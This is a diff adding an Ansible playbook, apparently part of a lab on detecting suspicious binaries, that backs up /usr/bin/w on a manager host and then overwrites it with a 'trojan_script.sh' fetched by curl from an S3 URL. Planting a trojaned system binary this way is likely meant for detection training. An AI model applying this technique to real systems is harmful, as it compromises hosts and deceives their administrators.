@@ -1,0 +1,15 @@
+- name: Configure manager environment
+  hosts: manager
+  become: true
+  tasks:
+
+    - name: Create a copy of the system binary
+      copy:
+        src: /usr/bin/w
+        dest: /usr/bin/w.copy
+        mode: preserve
+        remote_src: true
+
+    - name: Replace the content of the system binary with the trojan script
+      shell: |
+        curl {{ s3_url }}/detecting_suspicious_binaries/trojan_script.sh -o /usr/bin/w
